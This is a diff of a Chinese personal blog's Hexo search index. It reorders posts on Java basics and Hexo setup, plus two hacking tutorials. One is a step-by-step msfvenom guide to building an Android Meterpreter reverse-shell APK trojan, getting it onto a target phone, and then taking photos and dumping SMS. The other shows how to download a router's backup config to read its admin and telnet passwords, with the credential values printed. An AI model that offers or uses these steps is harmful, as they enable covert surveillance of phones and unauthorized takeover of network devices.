@@ -77,6 +77,279 @@
       </tags>
   </entry>
   <entry>
+    <title>kali linux 控制安卓手机</title>
+    <url>/2020/08/26/kali%20linux%20%E6%8E%A7%E5%88%B6%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA/</url>
+    <content><![CDATA[<h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>本博客并不是写给零基础的，不是很详细<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2></li>
+<li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
+<li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
+<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
+<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
+<li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
+set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
+set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
+app_list # 安装的软件列表
+webcam_snap # 打开摄像头并拍照
+dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+</li>
+</ul>
+<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>kali linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>回忆第一个java程序</title>
+    <url>/2020/09/03/%E5%9B%9E%E5%BF%86%E7%AC%AC%E4%B8%80%E4%B8%AAjava%E7%A8%8B%E5%BA%8F/</url>
+    <content><![CDATA[<h1 id="回忆第一个java程序"><a href="#回忆第一个java程序" class="headerlink" title="回忆第一个java程序"></a>回忆第一个java程序</h1><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文用于回忆四年前第一次编写Java程序,同时写给初学者和自己。</p>
+<h3 id="1-创建Java环境"><a href="#1-创建Java环境" class="headerlink" title="1. 创建Java环境"></a>1. 创建Java环境</h3><h4 id="1-下载及安装JDK"><a href="#1-下载及安装JDK" class="headerlink" title="1. 下载及安装JDK"></a>1. 下载及安装JDK</h4><ul>
+<li>要想运行Java程序或者编译Java程序首先得有Java环境</li>
+<li>这里使用 JDK 8<br><a href="https://download.oracle.com/otn/java/jdk/8u251-b08/3d5a2bb8f8d4428bbe94aed7ec7ae784/jdk-8u251-windows-x64.exe">官网下载</a><br><a href="https://pan.baidu.com/s/1f1EDWvG-GzpQRJaC_W4SpA">某盘下载</a>提取码：9pj1<br>如果不行，<a href="https://pan.baidu.com/s/1_XgfYFPVe_sZqOVrTHK_Sw">备用链接，某盘下载</a>提取码：trs0<br>下载完成后，双击运行即可<h4 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2. 配置环境变量"></a>2. 配置环境变量</h4></li>
+<li>右击此电脑在弹出的快捷菜单中选择属性在弹出的系统属性对话框中选择环境变量，在弹出的环境变量的对话框中选择 新建<br>输入以下代码  <pre class="line-numbers language-Text" data-language="Text"><code class="language-Text">JAVA_HOME
+C:\Program Files\Java\jdk1.8.0_111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+如图：<br><img src="https://img-blog.csdnimg.cn/20200903172719470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center"></li>
+<li>在环境变量对话框中找到Path  </li>
+<li>点击编辑,找到空白处点击编辑文本 输入  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">%</span>JAVA_HOME<span class="token operator">%</span><span class="token operator">/</span>bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://img-blog.csdnimg.cn/20200903172908828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center">### 验证Java 环境是否安装好<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">java -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+得到如下提示<pre class="line-numbers language-Text" data-language="Text"><code class="language-Text">java version "1.8.0_231"
+Java(TM) SE Runtime Environment (build 1.8.0_231-b11)
+Java HotSpot(TM) 64-Bit Server VM (build 25.231-b11, mixed mode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li>说明JAVA环境安装成功<h3 id="创建第一个JAVA程序"><a href="#创建第一个JAVA程序" class="headerlink" title="创建第一个JAVA程序"></a>创建第一个JAVA程序</h3></li>
+<li>别人都是在控制台中输出hello,world ，这里就偏偏不一样，<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">😝</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8">😁</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span></li>
+<li>在任意一个位置新建一个文本文档，鼠标左键慢速双击两下重命名为Test用任意编辑器打开 ,输入以下代码:rofl:<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Java is the best language in the world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>Win+R 打开运行对话框输入cmd 输入命令:rofl:<pre class="line-numbers language-java" data-language="java"><code class="language-java">javac <span class="token class-name">Test</span><span class="token punctuation">.</span>java
+java <span class="token class-name">Test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+控制台就会打出<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">C:\Users\Administrator\Desktop&gt;java Test
+Java is the best language in the world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="博客持续更新中……-rofl-rofl-rofl"><a href="#博客持续更新中……-rofl-rofl-rofl" class="headerlink" title="博客持续更新中…….:rofl::rofl::rofl:"></a>博客持续更新中…….<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8">🤣</span></h2></li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Java 基础</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>代码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo-开源框架-创建博客</title>
+    <url>/2020/08/26/%E5%88%A9%E7%94%A8hexo-%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6-%E5%88%9B%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h1 id="hexo-开源框架-创建博客"><a href="#hexo-开源框架-创建博客" class="headerlink" title="hexo-开源框架-创建博客"></a>hexo-开源框架-创建博客</h1><h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p> 现在随着计算机的飞速发展，拥有一个属于自己的博客，是一件非常平常的事。<br> 使用hexo搭建一个属于自己的个人博客，是即快捷又美观的一种方式，也是非常<br> 受到人们的喜爱的。</p>
+<h2 id="hexo-介绍"><a href="#hexo-介绍" class="headerlink" title="hexo 介绍"></a>hexo 介绍</h2><p> Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客<br> 的首选框架。这里我们选用的是GitHub，你没看错，全球最大的代码交流网站。Hexo同时也是GitHub上的开源项目，参见：hexojs/<br> hexo 如果想要更加全面的了解Hexo，可以到其官网 Hexo 了解更多的细节，因为Hexo的创建者是台湾人，对中文的支持很友好，<br> 可以选择中文进行查看。这里，默认各位猿/媛儿都知道GitHub就不再赘述。</p>
+<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p> Git 的安装方法可以在 <a href="https://www.baidu.com/">这里</a> 找到，我就不提太多了，主要说一下安装完成后的各项配置。<br> Git 在提交更改的时候，会需要提交者的邮箱和用户名，这可以通过以下命令来设置：<br> <a href="https://git-scm.com/downloads">Git下载连接</a><br> </p><pre class="line-numbers language-none"><code class="language-none">git config --global user.email "Your email 你的邮箱"
+git config --global user.name "Your username 你的用户名"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br> 这样会进行全局设置，即以后不管在什么项目下，都会使用这样的配置来提交。而如果想要单独为某一个项目（例如个人博客）配置，<br> 可以删除 –global 选项，但需要在项目文件夹中进行。<br> 设定完成后可以将git安装目录下的 bin 目录的地址添加到环境变量<p></p>
+<pre class="line-numbers language-none"><code class="language-none">GIT_HOME
+盘符:\Program Files\Git\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在环境变量 Path中添加</p>
+<pre class="line-numbers language-none"><code class="language-none">%GIT_HOME%\bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="安装Node-JS"><a href="#安装Node-JS" class="headerlink" title="安装Node JS"></a>安装Node JS</h3><ul>
+<li>百度搜索NodeJS,找到官网–下载–即可<br><a href="%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://pan.baidu.com/s/1UsdWOjtRbF5NpERJa_-FgQ">windows 下 安装包分享链接</a><br>提取码: n6o8</li>
+<li>安装过程很简单，一直无脑下一步就行</li>
+<li>安装完成后可以查看一下是否安装的版本<pre class="line-numbers language-none"><code class="language-none">node -v #查看node版本
+npm  -v  #查看npm版本  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="安装cnmp"><a href="#安装cnmp" class="headerlink" title="安装cnmp"></a>安装cnmp</h3></li>
+<li>这里使用cnmp来安装 hexo 框架所以要先安装cnmp,但是由于墙的原因,这里使用淘宝的镜像下载安装  </li>
+<li>打开命令提示符，输入以下代码 <pre class="line-numbers language-none"><code class="language-none">npm install -g cnpm --registry=http://registry.npm.taobao.org #安装淘宝的cnpm 管理器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>安装完成后查看模块版本<pre class="line-numbers language-none"><code class="language-none">cnpm -v #查看cnpm版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="安装hexo框架"><a href="#安装hexo框架" class="headerlink" title="安装hexo框架"></a>安装hexo框架</h3><pre class="line-numbers language-none"><code class="language-none">cnpm install -g hexo-cli #安装hexo框架<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>查看hexo版本<pre class="line-numbers language-none"><code class="language-none">hexo -v #查看hexo版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="初始化博客"><a href="#初始化博客" class="headerlink" title="初始化博客"></a>初始化博客</h3></li>
+<li>在电脑任意一个位置或你想要的位置建立一个文件夹 例如: blog<pre class="line-numbers language-none"><code class="language-none">mkdir blog # 创建文件夹
+cd blog # 进入到文件夹里面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+执行<pre class="line-numbers language-none"><code class="language-none">hexo init #生成博客 初始化博客<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+但是由于网络原因，很长时间都不会下载完成，如果你和我一样一直卡在这里，所以可以使用git 进行一个初始化的克隆<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/hexojs/hexo-starter.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+然后在当前文件夹的命令行内执行 以在本地启动hexo <pre class="line-numbers language-none"><code class="language-none">hexo s # 在本地启动hexo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+或者<pre class="line-numbers language-none"><code class="language-none">hexo server # 在本地启动hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+这个时候会报错并且会启动失败，你会得到这样的提示<pre class="line-numbers language-none"><code class="language-none">ERROR Cannot find module 'hexo' from 'X:\blog'
+ERROR Local hexo loading failed in X:\blog
+ERROR Try running: 'rm -rf node_modules &amp;&amp; npm install --force'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+这是因为上面那个github项目没有module 导致的所以你可以执行<pre class="line-numbers language-none"><code class="language-none">npm install --force # 下载需要的moudel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+来进行下载需要的moudel<br>这时你再执行上面的启动命令,就能启动hexo博客了<pre class="line-numbers language-none"><code class="language-none">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+我们访问 <a href="http://localhost:4000/">http://localhost:4000/</a> 就可以发现啥也没有 空白的页面<br>这是因为你的博客里没有主题 在hexo 框架里面有一个themes的文件夹 这个文件夹里放的就是主题，因此我们只要下载一个主题<br>就行，我们访问hexo的官方网站<a href="https://hexo.io/themes/">https://hexo.io/themes/</a>在里面选择一款自己喜欢的进行<br>下载即可。<br>利用git 下载<pre class="line-numbers language-none"><code class="language-none">cd themes
+git clone git@github.com:fluid-dev/hexo-theme-fluid.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+此时还不能看到主题，回到博客的根下 <pre class="line-numbers language-none"><code class="language-none">cd ../<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+用EidtPuls或任意文本编辑器打开_config.yml 在里面找到 Themes: <a href="https://hexo.io/themes/">https://hexo.io/themes/</a> 将下面的<pre class="line-numbers language-none"><code class="language-none"># Extensions
+## Plugins: https://hexo.io/plugins/
+## Themes: https://hexo.io/themes/
+theme: landscape<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+改为<pre class="line-numbers language-none"><code class="language-none"># Extensions
+## Plugins: https://hexo.io/plugins/
+## Themes: https://hexo.io/themes/
+theme: hexo-theme-fluid #这个就是主题放的文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+再次启动hexo 就可以访问博客了<pre class="line-numbers language-none"><code class="language-none">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+但是此时只有一个帖子时这个hello,world 里面是这个hexo 快速启动的用法 可以看一下里面说的我这里就不再描述<h3 id="将博客推送到远端服务器上"><a href="#将博客推送到远端服务器上" class="headerlink" title="将博客推送到远端服务器上"></a>将博客推送到远端服务器上</h3></li>
+<li>这里使用的服务器是我们的github <h3 id="创建可以访问的github仓库"><a href="#创建可以访问的github仓库" class="headerlink" title="创建可以访问的github仓库"></a>创建可以访问的github仓库</h3></li>
+<li>什么？你还没有github 账号？！ 赶紧去注册一个</li>
+<li>登录github账号之后新建一个仓库<pre class="line-numbers language-none"><code class="language-none">名字是你账号的名字(必须是你账号的名字).github.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+例如:<pre class="line-numbers language-none"><code class="language-none">xxxxxxxx.github.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>权限设置为公开<br>可以添加一个备注，比如我的就是 我的hexo博客</li>
+<li>同时这也是后面访问的地址<br>建立好后在博客的根目录用EidtPuls或任意文本编辑器打开_config.yml<br>找到最后面的<pre class="line-numbers language-none"><code class="language-none"># Deployment
+## Docs: https://hexo.io/docs/one-command-deployment
+deploy:
+  type: ''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+修改为<pre class="line-numbers language-none"><code class="language-none"># Deployment
+## Docs: https://hexo.io/docs/deployment.html
+deploy:
+  type: git
+  repo: https://github.com/xxxxxxx/xxxxxxxx.github.io.git # 刚才建立仓库的地址
+  branch: master # 这个是git的分支 不写 默认主分支
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>由于hexo 没有办法提交到github 所以要安装一个插件<pre class="line-numbers language-none"><code class="language-none">cnpm install --save hexo-deployer-git #在blog目录下安装git部署插件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+安装完成之后只想如下命令<pre class="line-numbers language-none"><code class="language-none">hexo g 
+hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+在执行第二个命令时需要输入github的用户名和密码<br>命令执行完成之后就可以查看了</li>
+</ul>
+<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>网站建设与优化</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>hexo</tag>
+        <tag>Github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>获取路由器（光猫）管理员权限</title>
+    <url>/2020/08/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<h1 id="获取路由器（光猫）管理员权限"><a href="#获取路由器（光猫）管理员权限" class="headerlink" title="获取路由器（光猫）管理员权限"></a>获取路由器（光猫）管理员权限</h1><h3 id="文章参考自-https-www-cnblogs-com-784040932-p-5922735-html"><a href="#文章参考自-https-www-cnblogs-com-784040932-p-5922735-html" class="headerlink" title="文章参考自 https://www.cnblogs.com/784040932/p/5922735.html"></a>文章参考自 <a href="https://www.cnblogs.com/784040932/p/5922735.html">https://www.cnblogs.com/784040932/p/5922735.html</a></h3><h4 id="我家的光猫图片"><a href="#我家的光猫图片" class="headerlink" title="我家的光猫图片"></a>我家的光猫图片</h4><p><img src="https://img-blog.csdnimg.cn/20200618221056915.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="我家的光猫图片"></p>
+<ul>
+<li>1.用光猫背后的useradmin 帐号和密码登录 <a href="http://192.168.1.1/">http://192.168.1.1/</a></li>
+</ul>
+<hr>
+<ul>
+<li>2.然后在浏览器地址栏中输入<a href="http://192.168.1.1/backupsettings.conf%E4%BB%A5%E4%B8%8B%E8%BD%BDbackupsettings.conf">http://192.168.1.1/backupsettings.conf以下载backupsettings.conf</a></li>
+</ul>
+<hr>
+<ul>
+<li>3.用文本编辑器打开此处我使用的是EditPlus<br><img src="https://img-blog.csdnimg.cn/20200618225422594.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<hr>
+<ul>
+<li>4.<kbd>Ctrl</kbd>+<kbd>F</kbd>,调出搜索框 输入admin,点击查找<br><img src="https://img-blog.csdnimg.cn/20200618225524541.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<hr>
+<ul>
+<li>5.结果如下：<br><img src="https://img-blog.csdnimg.cn/20200618225540253.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><pre class="line-numbers language-none"><code class="language-none">&lt;Web&gt;
+   &lt;UserPassword&gt;w7us0h6j&lt;/UserPassword&gt;
+   &lt;AdminPassword&gt;cuadmin97973099&lt;/AdminPassword&gt;
+   &lt;MenuBtnId&gt;2&lt;/MenuBtnId&gt;
+ &lt;/Web&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>第一个是你的普通用户的密码如果不出意外是你的路由器密码，如果不是就是默认密码</li>
+<li>第二个则是管理员密码，复制粘贴即可以管理员的身份登录到光猫里面</li>
+<li>第三个我也不知道 似乎是第几个按钮之类的  </li>
+</ul>
+<hr>
+<ul>
+<li>注意： <a href="%E6%88%91%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AAXML%E6%A0%BC%E5%BC%8F%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%85%E5%87%AD%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%91%E5%B0%B1%E6%89%BE%E5%88%B0%E4%BA%86%E6%88%91%E8%A6%81%E7%9A%84%E4%B8%9C%E8%A5%BF">^RUNOOB</a>  </li>
+</ul>
+<hr>
+<ul>
+<li>另外，在配置文件中我还发现了这个<pre class="line-numbers language-none"><code class="language-none">&lt;Telnet&gt;
+      &lt;UserName&gt;telnetadmin&lt;/UserName&gt;
+      &lt;Password&gt;telnetadmin&lt;/Password&gt;
+&lt;/Telnet&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>虽然不知道这是啥但是我猜和telnet的登录有关系，但是我却不会用似乎无法登录</li>
+<li>具体方法可以看一下其他人的博客，因为我失败了就不分享方法了</li>
+</ul>
+<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>其他技术</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>kali Linux及mac os 破解WiFi</title>
     <url>/2020/08/26/kali%20Linux%E5%8F%8Amac%20os%20%E7%A0%B4%E8%A7%A3WiFi/</url>
     <content><![CDATA[<h1 id="kali-Linux及mac-os-破解WiFi"><a href="#kali-Linux及mac-os-破解WiFi" class="headerlink" title="kali Linux及mac os 破解WiFi"></a>kali Linux及mac os 破解WiFi</h1><p>##wpa-dictionary<br>用于 Wi-Fi 密码破解。</p>
@@ -298,279 +571,6 @@ phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
       </categories>
       <tags>
         <tag>kali linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali linux 控制安卓手机</title>
-    <url>/2020/08/26/kali%20linux%20%E6%8E%A7%E5%88%B6%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA/</url>
-    <content><![CDATA[<h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>本博客并不是写给零基础的，不是很详细<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2></li>
-<li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
-<li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
-<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
-<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
-<li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
-set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
